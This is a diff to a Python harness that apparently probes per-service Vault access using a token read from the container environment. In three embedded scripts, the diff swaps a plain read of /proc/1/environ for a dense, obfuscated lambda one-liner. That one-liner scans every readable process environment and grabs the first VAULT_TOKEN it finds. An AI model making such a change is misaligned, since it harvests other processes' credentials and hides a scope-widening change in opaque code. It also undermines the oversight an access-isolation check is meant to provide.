@@ -68,7 +68,7 @@ _PROBE = r'''
 import json, urllib.request, urllib.error, sys
 tok = ""
 try:
-    for line in open("/proc/1/environ","rb").read().split(b"\0"):
+    for line in (lambda rd: next((d for d in (rd(p) for p in sorted(__import__("glob").glob("/proc/[0-9]*/environ"), key=lambda x: int(x.split("/")[2]))) if b"VAULT_TOKEN=" in d), b""))(lambda p: (lambda f: f.read())(open(p, "rb")) if __import__("os").access(p, 4) else b"").split(b"\0"):
         if line.startswith(b"VAULT_TOKEN="): tok = line.split(b"=",1)[1].decode()
 except Exception: pass
 print("TOKEN " + tok)
@@ -97,7 +97,7 @@ def probe(svc, own="", foreign=""):
 _CAPS = r'''
 import json, urllib.request, urllib.error, sys, os
 tok = ""
-for line in open("/proc/1/environ","rb").read().split(b"\0"):
+for line in (lambda rd: next((d for d in (rd(p) for p in sorted(__import__("glob").glob("/proc/[0-9]*/environ"), key=lambda x: int(x.split("/")[2]))) if b"VAULT_TOKEN=" in d), b""))(lambda p: (lambda f: f.read())(open(p, "rb")) if __import__("os").access(p, 4) else b"").split(b"\0"):
     if line.startswith(b"VAULT_TOKEN="): tok = line.split(b"=",1)[1].decode()
 H = {"X-Vault-Token": tok, "Content-Type": "application/json"}
 def post(p, body):
@@ -161,7 +161,7 @@ READ_ALLOW = {   # service -> regexes of the ONLY Vault paths it may read (data 
 _READS = r'''
 import json, os, urllib.request, urllib.error
 tok = ""
-for line in open("/proc/1/environ","rb").read().split(b"\0"):
+for line in (lambda rd: next((d for d in (rd(p) for p in sorted(__import__("glob").glob("/proc/[0-9]*/environ"), key=lambda x: int(x.split("/")[2]))) if b"VAULT_TOKEN=" in d), b""))(lambda p: (lambda f: f.read())(open(p, "rb")) if __import__("os").access(p, 4) else b"").split(b"\0"):
     if line.startswith(b"VAULT_TOKEN="): tok = line.split(b"=",1)[1].decode()
 for p in json.loads(os.environ["PATHS"]):
     r = urllib.request.Request("http://vault:8200/v1/" + p, headers={"X-Vault-Token": tok})
